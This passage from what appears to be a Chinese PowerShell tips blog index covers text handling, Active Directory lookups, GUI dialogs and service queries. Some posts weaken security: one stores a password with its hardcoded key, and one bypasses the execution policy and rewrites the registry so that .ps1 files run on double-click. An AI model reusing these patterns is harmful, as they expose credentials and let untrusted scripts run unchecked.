&quot;76492d1116743f0423413b16050a5345MgB8AFcAMABGAEIANAB1AGEAdQA3ADUASABhAE0AMgBNADUAUwBnAFYAYQA1AEEAPQA9AHwAMgAyAGIAZgA1ADUAZgA0ADIANAA0ADUANwA2ADAAMgA5ADkAZAAxAGUANwA4ADUAZQA4ADkAZAA1AGMAMAA2AA==&quot; $key = &quot;246 185 95 207 87 105 146 74 99 163 58 194 93 229 80 241 160 35 68 220 130 193 84 113 122 155 208 49 152 86 85 178&quot; $passwordSecure = ConvertTo-SecureString -String $password -Key ([Byte[]]$key.Split(&quot; &quot;)) $cred = New-Object system.Management.Automation.PSCredential(&quot;test\\tobias&quot;, $passwordSecure) $cred 当您运行它，它将生成一个 Credential 对象，您可以立即将它用于身份验证。只要将它传给一个需要 Credential 对象的形参即可。 再强调一下，这并不是安全的。但是要想获取密码的明文还需要更多点知识才行。","link":"/2013/10/08/password-obfuscator-script/"},{"title":"快速替换文本文件中的字符串","text":"不用开什么vim、emac、UltraEdit、Eclipse之类的编辑器了，PowerShell可以帮助手无寸铁的您快速地替换文本文件中的字符串： dir *.txt -Recurse | % { (gc $_ -Raw) | % { $_ ` -creplace '111', 'AAA' ` -creplace '222', 'BBB' ` -creplace '333', 'CCC' } | sc $_ } 注意 -creplace 区分大小写，-replace 不区分大小写。并且它们支持正则表达式！","link":"/2013/10/08/quickly-replace-strings-in-text-files/"},{"title":"PowerShell 技能连载 - 发生了什么？","text":"经常地，您需要用 PowerShell 来获取数据，并且您需要提取信息的一部分并且把它们用于报表。类似如下： $serial = Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property SerialNumber &quot;Serial Number is $serial&quot; 但是上述代码产生的结果如下： Serial Number is @{SerialNumber=00261-30000-00000-AA825} 当您查看 $serial 的值，它看起来似乎很正常： PS&gt; $serial SerialNumber ------------ 00261-30000-00000-AA825 但问题出在列头（译者注：我们只需要 SerialNumber 的值，而不是需要一个包含 SerialNumber 属性的临时对象）。您可以用 Select-Object 只选出一列，用 -ExpandProperty 而不是 -Property 就可以消除列头： $serial = Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty SerialNumber &quot;Serial Number is $serial&quot; 现在，一切正常了： Serial Number is 00261-30000-00000-AA825","link":"/2013/10/09/what-is-going-on-here/"},{"title":"PowerShell 技能连载 - 创建日历（和日期列表）","text":"以下是一段创建 DateTime 集合的脚本片段。只需要指定年和月，脚本将会针对该月的每一天创建一个 DateTime 对象： $month = 8 $year = 2013 1..[DateTime]::DaysInMonth($year,$month) | ForEach-Object { Get-Date -Day $_ -Month $month -Year $year } 这段代码十分有用：只要加一个日期过滤器，您就可以过滤出工作日来。它将列出指定月份的所有周一至周五（因为它排除了 weekday 0（星期日）和 weekday 6（星期六））： $month = 8 $year = 2013 1..[DateTime]::DaysInMonth($year,$month) | ForEach-Object { Get-Date -Day $_ -Month $month -Year $year } | Where-Object { 0,6 -notcontains $_.DayOfWeek } 类似地，以下代码将统计指定月份所有星期三和星期五的天数： $month = 8 $year = 2013 $days = 1..[DateTime]::DaysInMonth($year,$month) | ForEach-Object { Get-Date -Day $_ -Month $month -Year $year } | Where-Object { 3,5 -contains $_.DayOfWeek } $days &quot;There are {0} Wednesdays and Fridays&quot; -f $days.Count","link":"/2013/10/10/creating-calendars-and-lists-of-dates/"},{"title":"PowerShell 技能连载 - 从ISE编辑器中粘贴 PowerShell 代码","text":"PowerShell ISE 编辑器的代码复制粘贴功能十分强大，例如将代码复制粘贴到 Microsoft Word 和其它文字处理器。由于 ISE 将剪贴板文字格式化为 RTF 格式，颜色代码将不会丢失。 然而，粘贴的时候字体往往太大或太小。 您可以在 ISE 编辑器中更改它。打开工具 &gt; 选项，然后选择一个不同的字号。您在这儿选择的字号将用于粘贴的代码中。 当您更改完字号并关闭对话框之后，试着用 ISE 编辑器窗口右下角的滑块调整字体显示大小。这里的缩放级别只会影响 ISE 编辑器中的代码，并且不会影响粘贴的代码。 您也可以用鼠标滚轮来调整 ISE 编辑器中的显示字体大小。","link":"/2013/10/11/pasting-powershell-code-from-ise-editor/"},{"title":"PowerShell 技能连载 - 查找 Cmdlet","text":"Get-Command 可以用来查找 Cmdlet，但是在 PowerShell 3.0 中，它往往会返回比想象中还要多的 Cmdlet。由于自动加载模块的原因，Get-Command 不仅返回当前已加载 Module 中的 Cmdlet，还会返回所有可用 Module 中的 Cmdlet。 如果您仅希望在当前已加载的 Module 中查找一个 Cmdlet，请使用新的 -ListImported 参数： PS&gt; Get-Command -Verb Get | Measure-Object Count : 422 PS&gt; Get-Command -Verb Get -ListImported | Measure-Object Count : 174","link":"/2013/10/14/finding-cmdlets/"},{"title":"PowerShell 多行输入对话框、打开文件对话框、文件夹浏览对话框、输入框及消息框","text":"我热爱 PowerShell，当我需要提示用户输入时，我常常更喜欢使用 GUI 控件，而不是让他们什么都往控制台里输入有些东西比如说浏览文件或文件夹，或输入多行文本，不是很方便直接往 PowerShell 的命令行窗口中输入。所以我想我可以分享一些我常常用于这些场景的 PowerShell 脚本。 您可以从这儿下载包含以下所有函数的脚本。 显示消息框： # Show message box popup and return the button clicked by the user. Add-Type -AssemblyName System.Windows.Forms function Read-MessageBoxDialog([string]$Message, [string]$WindowTitle, [System.Windows.Forms.MessageBoxButtons]$Buttons = [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]$Icon = [System.Windows.Forms.MessageBoxIcon]::None) { return [System.Windows.Forms.MessageBox]::Show($Message, $WindowTitle, $Buttons, $Icon) } 提示简易的用户输入（单行）： # Show input box popup and return the value entered by the user. function Read-InputBoxDialog([string]$Message, [string]$WindowTitle, [string]$DefaultText) { Add-Type -AssemblyName Microsoft.VisualBasic return [Microsoft.VisualBasic.Interaction]::InputBox($Message, $WindowTitle, $DefaultText) } 提示输入一个文件路径（基于脚本小子的一篇文章）： # Show an Open File Dialog and return the file selected by the user. function Read-OpenFileDialog([string]$WindowTitle, [string]$InitialDirectory, [string]$Filter = &quot;All files (*.*)|*.*&quot;, [switch]$AllowMultiSelect) { Add-Type -AssemblyName System.Windows.Forms $openFileDialog = New-Object System.Windows.Forms.OpenFileDialog $openFileDialog.Title = $WindowTitle if (![string]::IsNullOrWhiteSpace($InitialDirectory)) { $openFileDialog.InitialDirectory = $InitialDirectory } $openFileDialog.Filter = $Filter if ($AllowMultiSelect) { $openFileDialog.MultiSelect = $true } $openFileDialog.ShowHelp = $true # Without this line the ShowDialog() function may hang depending on system configuration and running from console vs. ISE. $openFileDialog.ShowDialog() &gt; $null if ($AllowMultiSelect) { return $openFileDialog.Filenames } else { return $openFileDialog.Filename } } 提示输入一个文件夹（使用 System.Windows.Forms.FolderBrowserDialog 有可能会导致执行时挂起，要看系统配置以及从控制台运行还是从 PowerShell ISE中运行）： # Show an Open Folder Dialog and return the directory selected by the user. function Read-FolderBrowserDialog([string]$Message, [string]$InitialDirectory) { $app = New-Object -ComObject Shell.Application $folder = $app.BrowseForFolder(0, $Message, 0, $InitialDirectory) if ($folder) { return $folder.Self.Path } else { return '' } } 提示用户输入多行文本（基于TechNet 这篇文章中的代码）： function Read-MultiLineInputBoxDialog([string]$Message, [string]$WindowTitle, [string]$DefaultText) { &lt;# .SYNOPSIS Prompts the user with a multi-line input box and returns the text they enter, or null if they cancelled the prompt. .DESCRIPTION Prompts the user with a multi-line input box and returns the text they enter, or null if they cancelled the prompt. .PARAMETER Message The message to display to the user explaining what text we are asking them to enter. .PARAMETER WindowTitle The text to display on the prompt window's title. .PARAMETER DefaultText The default text to show in the input box. .EXAMPLE $userText = Read-MultiLineInputDialog &quot;Input some text please:&quot; &quot;Get User's Input&quot; Shows how to create a simple prompt to get mutli-line input from a user. .EXAMPLE # Setup the default multi-line address to fill the input box with. $defaultAddress = @' John Doe 123 St. Some Town, SK, Canada A1B 2C3 '@ $address = Read-MultiLineInputDialog &quot;Please enter your full address, including name, street, city, and postal code:&quot; &quot;Get User's Address&quot; $defaultAddress if ($address -eq $null) { Write-Error &quot;You pressed the Cancel button on the multi-line input box.&quot; } Prompts the user for their address and stores it in a variable, pre-filling the input box with a default multi-line address. If the user pressed the Cancel button an error is written to the console. .EXAMPLE $inputText = Read-MultiLineInputDialog -Message &quot;If you have a really long message you can break it apart`nover two lines with the powershell newline character:&quot; -WindowTitle &quot;Window Title&quot; -DefaultText &quot;Default text for the input box.&quot; Shows how to break the second parameter (Message) up onto two lines using the powershell newline character (`n). If you break the message up into more than two lines the extra lines will be hidden behind or show ontop of the TextBox. .NOTES Name: Show-MultiLineInputDialog Author: Daniel Schroeder (originally based on the code shown at http://technet.microsoft.com/en-us/library/ff730941.aspx) Version: 1.0 #&gt; Add-Type -AssemblyName System.Drawing Add-Type -AssemblyName System.Windows.Forms # Create the Label. $label = New-Object System.Windows.Forms.Label $label.Location = New-Object System.Drawing.Size(10,10) $label.Size = New-Object System.Drawing.Size(280,20) $label.AutoSize = $true $label.Text = $Message # Create the TextBox used to capture the user's text. $textBox = New-Object System.Windows.Forms.TextBox $textBox.Location = New-Object System.Drawing.Size(10,40) $textBox.Size = New-Object System.Drawing.Size(575,200) $textBox.AcceptsReturn = $true $textBox.AcceptsTab = $false $textBox.Multiline = $true $textBox.ScrollBars = 'Both' $textBox.Text = $DefaultText # Create the OK button. $okButton = New-Object System.Windows.Forms.Button $okButton.Location = New-Object System.Drawing.Size(510,250) $okButton.Size = New-Object System.Drawing.Size(75,25) $okButton.Text = &quot;OK&quot; $okButton.Add_Click({ $form.Tag = $textBox.Text; $form.Close() }) # Create the Cancel button. $cancelButton = New-Object System.Windows.Forms.Button $cancelButton.Location = New-Object System.Drawing.Size(415,250) $cancelButton.Size = New-Object System.Drawing.Size(75,25) $cancelButton.Text = &quot;Cancel&quot; $cancelButton.Add_Click({ $form.Tag = $null; $form.Close() }) # Create the form. $form = New-Object System.Windows.Forms.Form $form.Text = $WindowTitle $form.Size = New-Object System.Drawing.Size(610,320) $form.FormBorderStyle = 'FixedSingle' $form.StartPosition = &quot;CenterScreen&quot; $form.AutoSizeMode = 'GrowAndShrink' $form.Topmost = $True $form.AcceptButton = $okButton $form.CancelButton = $cancelButton $form.ShowInTaskbar = $true # Add all of the controls to the form. $form.Controls.Add($label) $form.Controls.Add($textBox) $form.Controls.Add($okButton) $form.Controls.Add($cancelButton) # Initialize and show the form. $form.Add_Shown({$form.Activate()}) $form.ShowDialog() &gt; $null # Trash the text of the button that was clicked. # Return the text that the user entered. return $form.Tag } 所有的这些，除了多行输入框以外，都是直接使用了现有的 Windows Form 或 Visual Basic 控件。以下是我的多行输入框显示的模样： 我曾经使用动词 Get 作为函数的前缀，然后改成了动词 Show，但是读完整篇文章以后，我觉得使用动词 Read 也许是最合适的（而且它和 Read-Host Cmdlet的形式相匹配）。 希望您觉得这篇文章有用。 Happy coding!","link":"/2013/10/15/powershell-multi-line-input-box-dialog-open-file-dialog-folder-browser-dialog-input-box-and-message-box/"},{"title":"将 Windows 8.1 的命令提示符替换为 PowerShell","text":"在 Windows 8.1 中，增加了一个“将 WIN+X 菜单中将命令提示符替换为 Windows PowerShell”功能，您注意到了吗？ 打开这个选项的方法是：右键单击 Windows 任务栏，选择“属性”。在“导航”选项卡中，您可以找到这个功能。","link":"/2013/10/15/replace-command-prompt-by-powershell-in-windows-81/"},{"title":"PowerShell 技能连载 - 在 ISE 中重设 PowerShell 宿主","text":"想象一下您在 ISE 编辑器中长时间地编写一个脚本。当您开发的时候，您也许定义了变量、创建了函数、加载了对象，等等。 要确保您的脚本能像所希望的那样运行，您最终需要一个干净的测试环境。 获得一个干净的 PowerShell 并且移除所有变量和函数的最简单办法如下： 在 ISE 编辑器中，选择 文件 &gt; 新建 PowerShell 选项卡。这实际上将创建一个新的 PowerShell 选项卡，以及一个全新的 PowerShell 宿主。这将确保没有任何不希望存在的旧变量和函数存在。","link":"/2013/10/15/resetting-powershell-host-in-ise/"},{"title":"PowerShell 技能连载 - 查找 Active Directory 用户账号","text":"有很多用于 Active Directory 的 Module 和 Cmdlet，但是有些时候用 .NET 代码来做反而更方便快捷。 比如说，如果您只是想知道，某个用户是否存在于您的 Active Directory中，那么实现查找一个用户是很容易的： # sending LDAP query to Active Directory $searcher = [ADSISearcher]'(&amp;(objectClass=User)(objectCategory=person)(SamAccountName=tobias*))' # finding first match $searcher.FindOne() # finding ALL matches $searcher.FindAll() 这段代码将查找所有 SamAccountName 以 “tobias” 开头的用户账号。您可以接着用这个方法来便捷地找出这个用户所在的位置： # find account location $searcher.FindAll() | Select-Object -ExpandProperty Path","link":"/2013/10/16/finding-ad-user-accounts/"},{"title":"PowerShell 技能连载 - 查找当前的脚本文件夹","text":"从 PowerShell 3.0 开始，有一个很简单的办法来确定一个脚本所在的文件夹：$PSScriptRoot。这个变量总是保存了指定脚本所存放的文件夹路径。 通过这种方法，可以很方便地加载额外的资源，比如说其它脚本。以下代码将读取位于同一个文件夹中，一个名为 myFunctions.ps1 的脚本文件： &quot;$PSScriptRoot\\myFunctions.ps1&quot; 别忘了用“dot-source”语法（在路径之前加点号）。否则只会输出该路径名（而不是执行该路径表示的脚本）。","link":"/2013/10/18/finding-current-script-folder/"},{"title":"下载 Visual Studio 2013","text":"下载信息英文版Visual Studio Ultimate 2013 (x86) - DVD (English) 语言：英语(美国) 文件名：en_visual_studio_ultimate_2013_x86_dvd_3009107.iso 发布日期(UTC)：2013-10-17 18:43:01文件大小：2.82 GB SHA1：79DBBA7B6EF12B1A4E715A7F20951EE66FBCDAB4 英文版下载地址（HTTP） 英文版下载地址（ED2K） 英文WEB在线安装版 中文版Visual Studio Ultimate 2013 (x86) - DVD (Chinese-Simplified) 语言：中文(简体) 文件名：cn_visual_studio_ultimate_2013_x86_dvd_3009109.iso 发布日期(UTC)：2013-10-17 18:43:01文件大小：2.87 GB SHA1：07313542D36ED8BEEF18520AA4F15E33E32C7F77 中文版下载地址（HTTP） 中文版下载地址（ED2K） 中文WEB在线安装版 相关链接 官方下载页面（中文） 官方下载页面（英文） Announcing the Release of Visual Studio 2013 and Great Improvements to ASP.NET and Entity Framework","link":"/2013/10/19/download-visual-studio-2013/"},{"title":"PowerShell 技能连载 - 获取 Active Directory 账户信息","text":"在上一段脚本中，您应该已经发现了可以多么轻易地用几行 PowerShell 代码来获取 Active Directory 账户。它的结果是一个搜索结果对象，而不是实际的账户对象。 要获取一个账户的更详细信息，请使用 GetDirectoryEntry() 将搜索结果转换为一个实际的账户对象： # get 10 results max $searcher.SizeLimit = 10 # find account location $searcher.FindAll() | # get account object ForEach-Object { $_.GetDirectoryEntry() } | # display all properties Select-Object -Property * | # display in a grid view window (ISE needs to be installed for this step) Out-GridView","link":"/2013/10/17/getting-active-directory-account-information/"},{"title":"PowerShell 技能连载 - 将二进制 SID 转换为 SID 字符串","text":"Active Directory 账户有一个二进制形式存储的 SID。要将字节数组转换为字符串的表达形式，可以用如下的 .NET 函数： # get current user $searcher = [ADSISearcher]&quot;(&amp;(objectClass=User)(objectCategory=person)(sAMAccountName=$env:username))&quot; $user = $searcher.FindOne().GetDirectoryEntry() # get binary SID from AD account $binarySID = $user.ObjectSid.Value # convert to string SID $stringSID = (New-Object System.Security.Principal.SecurityIdentifier($binarySID,0)).Value $binarySID $stringSID 在这个例子中，一个 ADSI 搜索器获取当前的用户账户（返回当前登录到一个域中的用户）。然后，将二进制的 SID 转换为 SID 字符串。","link":"/2013/10/21/converting-binary-sid-to-string-sid/"},{"title":"PowerShell 技能连载 - 从 DN 中获得 Domain","text":"“DN” 指的是是 Active Directory 对象的路径，看起来大概如下： 'CN=Tobias,OU=Authors,DC=powershell,DC=local' 要获取 DN 中的域部分，请使用如下代码： $DN = 'CN=Tobias,OU=Authors,DC=powershell,DC=local' $pattern = '(?i)DC=\\w{1,}?\\b' ([RegEx]::Matches($DN, $pattern) | ForEach-Object { $_.Value }) -join ',' 这段代码用一个正则表达式来查找 DN 的所有 DC= 部分然后将它们用逗号分隔符连接起来。 执行结果如下： DC=powershell,DC=local","link":"/2013/10/22/getting-domain-from-dn/"},{"title":"快速运行 .ps1 脚本的 N 种方法","text":"由于安全的原因，微软禁止以双击的方式执行 PowerShell 的 .ps1 脚本。但如果我们一味地追求效率，而暂时“无视”其安全性的话，要怎样快速地执行 .ps1 脚本呢？以下是 QQ 群里讨论的一些方案： 为每个 .ps1 配一个 .cmd 批处理文件这种方法适用于可能需要将 PowerShell 脚本发送给朋友执行，而朋友可能只是初学者或普通用户的场景，并且该脚本不会修改注册表。具体做法是：将以下代码保存为一个 .cmd 文件，放在 .ps1 的同一个目录下。注意主文件名必须和 .ps1 的主文件名一致。 @set Path=%Path%;%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\ &amp; powershell -ExecutionPolicy Unrestricted -NoExit -NoProfile %~dpn0.ps1 例如，您希望朋友执行 My-Script.ps1，那么您只需要将以上代码保存为 My-Script.cmd，放在同一个目录之下发给您的朋友即可。 这种方法还有个小小的好处是，不需要为不同的 .ps1 而修改 .cmd 的内容。 用批处理文件做一个简单的菜单，列出 .ps1 文件该方法由 @PS 网友提供。优点在于可以为多个 .ps1 脚本配一个 .cmd 批处理。执行 .cmd 以后，将显示一个简易的字符界面选择菜单。可以根据用户的选择执行相应的 .ps1 脚本。以下是代码： @echo off setlocal enabledelayedexpansion for %%i in (*.ps1) do ( set /a num+=1 set .!num!=%%i echo !num!. %%i ) set/p n=这里输入序列： echo !.%n%! set Path=%Path%;%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\ &amp; powershell -ExecutionPolicy Unrestricted -NoProfile .\\!.%n%! pause 用命令行修改 PowerShell 文件的打开方式该方法由 @史瑞克 网友提供，只需要在命令行中执行一次以下代码，以后即可双击运行 .ps1 脚本： ftype Microsoft.PowerShellScript.1=&quot;%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe&quot; &quot;.\\%1&quot; 用这种方法可以设置打开方式和默认打开方式，需要管理员权限。恢复方法： ftype Microsoft.PowerShellScript.1=&quot;%SystemRoot%\\system32\\notepad.exe&quot; &quot;%1&quot; 用 PowerShell 脚本修改 PowerShell 文件的打开方式该方法由 StackOverflow 上的 @JPBlanc 网友提供。只需要在 PowerShell 中执行一次以下代码，以后即可双击运行 .ps1 脚本。优点是可以开可以关。原文是法文，已由 @Andy Arismendi 网友翻译为英文。 &lt;# .SYNOPSIS Change the registry key in order that double-clicking on a file with .PS1 extension start its execution with PowerShell. .DESCRIPTION This operation bring (partly) .PS1 files to the level of .VBS as far as execution through Explorer.exe is concern. This operation is not advised by Microsoft. .NOTES File Name : ModifyExplorer.ps1 Author : J.P. Blanc - jean-paul_blanc@silogix-fr.com Prerequisite: PowerShell V2 on Vista and later versions. Copyright 2010 - Jean Paul Blanc/Silogix .LINK Script posted on: http://www.silogix.fr .EXAMPLE PS C:\\silogix&gt; Set-PowAsDefault -On Call Powershell for .PS1 files. Done ! .EXAMPLE PS C:\\silogix&gt; Set-PowAsDefault Tries to go back Done ! #&gt; function Set-PowAsDefault { [CmdletBinding()] Param ( [Parameter(mandatory=$false,ValueFromPipeline=$false)] [Alias(&quot;Active&quot;)] [switch] [bool]$On ) begin { if ($On.IsPresent) { Write-Host &quot;Call Powershell for .PS1 files.&quot; } else { Write-Host &quot;Try to go back.&quot; } } Process { # Text Menu [string]$TexteMenu = &quot;Go inside PowerShell&quot; # Text of the program to create [string] $TexteCommande = &quot;%systemroot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -Command &quot;&quot;&amp;'%1'&quot;&quot;&quot; # Key to create [String] $clefAModifier = &quot;HKLM:\\SOFTWARE\\Classes\\Microsoft.PowerShellScript.1\\Shell\\Open\\Command&quot; try { $oldCmdKey = $null $oldCmdKey = Get-Item $clefAModifier -ErrorAction SilentlyContinue $oldCmdValue = $oldCmdKey.getvalue(&quot;&quot;) if ($oldCmdValue -ne $null) { if ($On.IsPresent) { $slxOldValue = $null $slxOldValue = Get-ItemProperty $clefAModifier -Name &quot;slxOldValue&quot; -ErrorAction SilentlyContinue if ($slxOldValue -eq $null) { New-ItemProperty $clefAModifier -Name &quot;slxOldValue&quot; -Value $oldCmdValue -PropertyType &quot;String&quot; | Out-Null New-ItemProperty $clefAModifier -Name &quot;(default)&quot; -Value $TexteCommande -PropertyType &quot;ExpandString&quot; | Out-Null Write-Host &quot;Done !&quot; } else { Write-Host &quot;Already done !&quot; } } else { $slxOldValue = $null $slxOldValue = Get-ItemProperty $clefAModifier -Name &quot;slxOldValue&quot; -ErrorAction SilentlyContinue if ($slxOldValue -ne $null) { New-ItemProperty $clefAModifier -Name &quot;(default)&quot; -Value $slxOldValue.&quot;slxOldValue&quot; -PropertyType &quot;String&quot; | Out-Null Remove-ItemProperty $clefAModifier -Name &quot;slxOldValue&quot; Write-Host &quot;Done !&quot; } else { Write-Host &quot;No former value !&quot; } } } } catch { $_.exception.message } } end {} } 使用方法很简单，Set-PowAsDefault -On为打开，Set-PowAsDefault为关闭。需要管理员权限。 以上是目前搜集的几种方法，希望对您有用。您可以在这里下载以上所有脚本的例子。","link":"/2013/10/23/n-ways-to-run-ps1-rapidly/"},{"title":"PowerShell 技能连载 - 在不同的 Domain 中查找","text":"当你那使用 ADSISearcher 类型加速器来查找 Active Directory 账户时，它缺省情况下在您当前登录的域中查找。如果您需要在一个不同的域中查找，请确保相应地定义了搜索的根路径。 This example will find all accounts with a SamAccountName that starts with “tobias”, and it searches the domain “powershell.local” (adjust to a real domain name, of course):这个例子将查找所有 SamAccountName 以 “tobias” 开头的账户，并且它在 “powershell.local” 域中搜索（当然，请根据实际情况调整名字）： # get all users with a SamAccountName that starts with &quot;tobias&quot; $searcher = [ADSISearcher]&quot;(&amp;(objectClass=User)(objectCategory=person)(sAMAccountName=tobias*))&quot; # use powershell.local for searching $domain = New-Object System.DirectoryServices.DirectoryEntry('DC=powershell,DC=local') $searcher.SearchRoot = $domain # execute the query $searcher.FindAll()","link":"/2013/10/23/searching-in-different-domains/"},{"title":"用 PowerShell 处理纯文本 - 2","text":"应朋友要求，帮忙解决一例 PowerShell 问题： 有一个 CSV 文件，其中有一个 Photo 字段存的是 BASE64 编码的字符串，这个字符串包含换行符。在 Import-Csv 的时候，Photo 字段不会作为一个整体值，而是会变成每行一个。文件的内容是这样的： StaffNum,LogonName,ObjName,Title,Office,Department,Photo 03138,wangjunhao,王俊豪,流程优化主管,宜山路,运营平台中心/项目部,/9j/4AAQSkZJRgABAgAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a HBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIy ... PyoooGSr0qRCdtFFMBy9qkFFFJCYo60w85oopgNzjoBTto9KKKQj/9k= 为了解决这个 case，先归纳它的规律： BASE64 字符串的字符集为 0..9、a..z、A..Z，以及/和=。 BASE64 字符串每一行不超过 76 个字符。 如果某一行从第一个字符到最后一个字符，都符合上述 2 条规律，说明前一行并没有结束。应当把当前行拼接到前一行中。 根据以上规律编写 PowerShell 代码： $fileName = 'AllUsers.csv' $currentLine = '' gc $fileName | % -process { if ($_ -cmatch '^[a-zA-Z0-9/+=]{1,76}$') { # 如果符合 BASE64 特征，说明上一行未结束。 $currentLine += $_ } else { # 如果不符合 BASE64 特征，说明上一行是完整的。 Write-Output $currentLine $currentLine = $_ } } -end { $currentLine } | ConvertFrom-Csv 完整的 .CSV 及 .PS1 文件请在这里下载。","link":"/2013/10/23/processing-plain-text-with-powershell-2/"},{"title":"PowerShell 技能连载 - 通过 SID 查找 Active Directory 账户","text":"如果您已知账户的 SID 并且希望找到相应的 Active Directory 账户，那么 LDAP 查询并不适合这项工作。为了使它能工作，您需要将 SID 的格式改成符合 LDAP 规则的格式，这不是一个简单的过程。 以下是一个更简单的使用 LDAP 路径的办法。假设您使用 $SID 变量保存了一个 SID 字符串，并且您希望查找出和它关联的 Active Directory 账户。试试以下的代码： $SID = '&lt;enter SID here&gt;' # like S-1-5-21-1234567-... $account = [ADSI]&quot;LDAP://&lt;SID=$SID&gt;&quot; $account $account.distinguishedName","link":"/2013/10/24/finding-active-directory-accounts-by-sid/"},{"title":"PowerShell 技能连载 - 快速查找 Active Directory 用户账户","text":"LDAP 查询条件越明确，查询速度就越快，占用的资源就越少，并且查询结果越清晰。 例如，许多人使用 objectClass 来限制查询结果为某个指定的对象类型。若只需要查询用户账户，他们常常使用 &quot;objectClass=user&quot; 的写法。许多人不知道计算机账户也共享这个对象类型。让我们来验证这一点： 这个例子将会查找所有 SamAccountName 以 “a” 开头，并且 objectClass=”user” 的账户。 # get all users with a SamAccountName that starts with &quot;a&quot; $searcher = [ADSISearcher]&quot;(&amp;(objectClass=User)(sAMAccountName=a*))&quot; # see how long this takes $result = Measure-Command { $all = $searcher.FindAll() $found = $all.Count } $seconds = $result.TotalSeconds &quot;The search returned $found objects and took $sec seconds.&quot; 然后使用这行来代替上面的代码： $searcher = [ADSISearcher]&quot;(&amp;(sAMAccountType=$(0x30000000))(sAMAccountName=a*))&quot; 当您换成这行代码以后，查询速度显著提升了。并且结果更清晰。这是因为普通用户账户和计算机账户的 SamAccountType 不同： SAM_NORMAL_USER_ACCOUNT 0x30000000 SAM_MACHINE_ACCOUNT 0x30000001 两者的 objectClass 都属于 “User”。","link":"/2013/10/25/finding-active-directory-user-accounts-fast/"},{"title":"PowerShell 技能连载 - 在智能感知中隐藏参数","text":"从 PowerShell 4.0 开始，脚本作者可以决定隐藏某些参数，使之不在智能感知中出现。通过这种方式，可以在 ISE 的智能感知上下文菜单中隐藏不常用的参数。 function Test-Function { param( $Name, [Parameter(DontShow)] [Switch] $IAmSecret ) if ($IAmSecret) { &quot;Doing secret things with $Name&quot; } else { &quot;Regular behavior with $Name&quot; } } 当您在 PowerShell 4.0 ISE 中运行这个函数时，只有 “Name” 参数会出现在智能感知上下文菜单中。然而，如果您事先知道这个隐藏参数，并且键入了第一个字母，然后按下 (TAB) 键，这个参数仍会显示： 在帮助窗口，隐藏参数总是可以显示，您可以通过类似这种方式打开：","link":"/2013/10/28/hiding-parameters-from-intellisense/"},{"title":"PowerShell 技能连载 - 获取 1000 个以上 Active Directory 结果","text":"当您使用 ADSISearcher 时，默认情况下，Active Directory 只返回前 1000 个搜索结果。这是一个防止意外的 LDAP 查询导致域控制器负荷过重的安全保护机制。 如果您需要完整的搜索结果，并且明确地知道它将超过 1000 条记录，请设置 PageSize 为 1000。通过这种方式，ADSISearcher 每一批返回 1000 个搜索结果元素。 以下查询将会返回您域中的所有用户账户（在运行这个查询之前，您也许需要联系一下您的域管理员）： $searcher = [ADSISearcher]&quot;sAMAccountType=$(0x30000000)&quot; # get all results, do not stop at 1000 results $searcher.PageSize = 1000 $searcher.FindAll() | ForEach-Object { $_.GetDirectoryEntry() } | Select-Object -Property * | Out-GridView","link":"/2013/10/29/getting-more-than-1000-active-directory-results/"},{"title":"PowerShell 技能连载 - 在 PowerShell 中查找服务","text":"Get-Service 可以列出计算机上的所有服务，但是返回的信息十分少。您无法很容易地看出一个服务做什么、它是一个 Microsoft 服务还是一个第三方服务，以及服务所对应的可执行程序。 通过合并一些信息，您可以获取许多更丰富的信息。以下是一个 Find-Service 函数，可以返回一系列丰富的信息： function Find-Service { param ( $Name = '*', $DisplayName = '*', $Started ) $pattern = '^.*\\.exe\\b' $Name = $Name.Replace('*','%') $DisplayName = $DisplayName.Replace('*','%') Get-WmiObject -Class Win32_Service -Filter &quot;Name like '$Name' and DisplayName like '$DisplayName'&quot;| ForEach-Object { if ($_.PathName -match $pattern) { $Path = $matches[0].Trim('&quot;') $file = Get-Item -Path $Path $rv = $_ | Select-Object -Property Name, DisplayName, isMicrosoft, Started, StartMode, Description, CompanyName, ProductName, FileDescription, ServiceType, ExitCode, InstallDate, DesktopInteract, ErrorControl, ExecutablePath, PathName $rv.CompanyName = $file.VersionInfo.CompanyName $rv.ProductName = $file.VersionInfo.ProductName $rv.FileDescription = $file.VersionInfo.FileDescription $rv.ExecutablePath = $path $rv.isMicrosoft = $file.VersionInfo.CompanyName -like '*Microsoft*' $rv } else { Write-Warning (&quot;Service {0} has no EXE attached. PathName='{1}'&quot; -f $_.PathName) } } } Find-Service | Out-GridView","link":"/2013/10/30/finding-services-in-powershell/"},{"title":"PowerShell 技能连载 - 怪异的文本格式化（以及解决方法）","text":"试试以下的代码并且找到问题所在： $desc = Get-Process -Id $pid | Select-Object -Property Description &quot;PowerShell process description: $desc&quot; 这段代码的目的是获取 PowerShell 宿主进程并且读取进程的描述信息，然后输出到字符串。它的结果看起来是怪异的： PowerShell process description: @{Description=Windows PowerShell} 这是因为代码中选择了整个 Description 属性，而且结果不仅是描述字符串，而且包括了整个属性： PS&gt; $desc Description ----------- Windows PowerShell ISE 当您只选择一个属性时，请确保使用 -ExpandProperty 而不是 -Property。前者避免产生一个属性列，并且字符串看起来正常了： PS&gt; $desc = Get-Process -Id $pid | Select-Object -ExpandProperty Description PS&gt; &quot;PowerShell process description: $desc&quot; PowerShell process description: Windows PowerShell ISE","link":"/2013/10/31/weird-text-formatting-and-what-to-do-about-it/"},{"title":"用 PowerShell 处理纯文本 - 3","text":"命题： 怎样把字符 “ABC-EFGH-XYZ” 替换为 “012-3456-789” 为了解决这个 case，先归纳它的规律： 注意字符集和数字之间的对应关系，我们可以自定义一个字符集来表示。 保留 - 号。 不区分大小写，提高适应性。 根据以上规律编写 PowerShell 代码： $charSet = 'ABCEFGHXYZ'.ToCharArray() $text = 'ABC-EFGH-XYZ' $array = ($text.ToUpper().ToCharArray() | % { if ($_ -eq '-') { '-' } else { [string]([System.Array]::IndexOf($charSet, $_)) } }) $array -join '' 结果是： 